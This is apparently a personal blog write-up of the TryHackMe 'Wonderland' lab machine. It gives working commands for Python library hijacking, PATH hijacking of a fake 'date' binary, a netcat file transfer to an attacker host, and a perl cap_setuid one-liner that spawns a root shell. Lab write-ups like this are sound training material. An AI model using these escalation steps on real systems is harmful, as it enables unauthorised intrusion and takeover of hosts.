---
title: TryHackMe WonderLand Writeup
image: /images/wonder/alice.jpeg
tags: 
- tryhackme
- writeup
---

Do you see that? Those things on the floor? Yeah those are the broken pieces of my schedule this week. Such a messy week. I started an internship and my days of solving tryhackme and hackthebox machines whole day are pretty much over. So now I am just trying to squeeze all the time I can just for one machine and its writeup. I used to do about 3 machines per week and that streak has been burned and casted into the void of darkness and pain. Enough of babbling about me. Lets dive into the writeup. 

<!--more-->

<img src="/images/wonder/alice.jpeg" width="1000" height="500"/>

Usual nmap scan shows the usual results.
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Browsing to webpage.

<img src="/images/wonder/website.png" width="1000" />

While doing usual enumeration I run Dirbuster with common.txt list. 
<img src="/images/wonder/Dirb.png">

We see a "*r a b b i t*". Browsing to that directory we just see another uninteresting page **but** the source html says otherwise.

<img src="/images/wonder/creds.png">

Looks like creds to me. Trying these creds on SSH gives us the initial foothold. 

```
ssh alice@10.10.218.31
alice@10.10.218.31's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep 25 05:32:08 UTC 2020

  System load:  0.0                Processes:           88
  Usage of /:   18.9% of 19.56GB   Users logged in:     1
  Memory usage: 28%                IP address for eth0: 10.10.218.31
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 25 05:27:55 2020 from 10.9.37.30
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
```

We see the root flag already and another python script. Ofcourse we are not able to read the root flag yet. Reading the hint given in the room it says that everything is inverted... Hmm So if the root flag is in user directory then maybe the user flag is inside the root directory? Doing "`cat /root/user.txt`" gives us the first flag. 

Next I start enumerating and the first thing you should try gives us the next clue.

```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

We are allowed to run the given command as the user rabbit. Lets finally see what is inside the walrus_and_the_carpenter.py file.

```
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

--snip--
"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

It is importing the python library "random". Looks like Python Library hijacking to me. To exploit this just create a python file in the same directory with the name "random.py" with malicious code inside. I go ahead and create a "random.py" file with the following content:

```
import os
os.system("/bin/bash")
```

and now when we run the command that we got from "`sudo -l`"

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$
```

We are greeted with shell for rabbit user. Next we see a binary named "teaParty" inside the rabbit's home directory. It is owned by the user hatter and we can run it. Running it gives nothing interesting So I guess we are doing reverse engineering now.

Transfer the binary to my machine using the netcat method like:

On my machine
```
nc -lvp 1234 > teaParty
```

On the target machine
```
nc YourIP 1234 < teaParty
```

Just press ctrl+c after some time and you can see the binary is transferred to your machine. Now one of the basics in reverse engineering is using the "strings" command on it.

```
strings teaParty

setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
```

We see some code from the binary. Looks like it is using date binary without specifying the full path. Like python library hijacking we can do the same thing with the date binary. 

Create a file named "date" inside the /tmp directory. Looks like nano isnt available So I tried to use vim for the first time. Pretty easy. Just follow [this article](https://www.cyberciti.biz/faq/vim-new-file-creation-command-on-linux-unix/).

I create a file named date with the following content:

```
#!/bin/bash
/bin/bash
```

We need to set the path variable so that the teaParty binary looks for our malicious date binary instead of the proper date binary. 

```
export PATH=/tmp:$PATH
```

When you run the teaParty binary you are greeted with the shell for the user hatter. Looking inside the home directory of hatter we just see a file containing password for hatter. It is was pretty convinient since it was more like checkpoint. If we somehow loose our shell now we can just ssh into the user hatter without going through all the above hassle.

Next I transfer the linpeas script and run it. I see something I haven't before.

```
Files with capabilities:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

After some googling I find [an awesome article](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) from hacking articles yet again!

Also there is a [GTFO Page for this vulnerability](https://gtfobins.github.io/gtfobins/perl/)

Here is what I understand about the exploit:

If you want a binary or process to have higher privilege  you probably set the UID for it. But what if you don't want to give it the whole permissions of the root user but just a part of it? Here comes in the concept of "Capabilities". This is like setUId but the big difference is that it helps us to provide just the necessary permissions to the binary or process. Here we see that perl has the setUID capability which means it has the permission to set UIDs. We use this to set the UID of our process to 0 (which is root) and spawn a shell. Maybe doing it will make more sense.

Here is the command we use:

```
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
```

We have gained a root shell. Lets break down the command. First we specify the binary we want to use. "-e" is used to execute commands. Next two commands we set the uid of perl to 0(root). Finally we spawn a shell.

All in all I missed doing these rooms and will try to get back on the track after I get used to all this mess. I still haven't failed to release a blog per week ;)
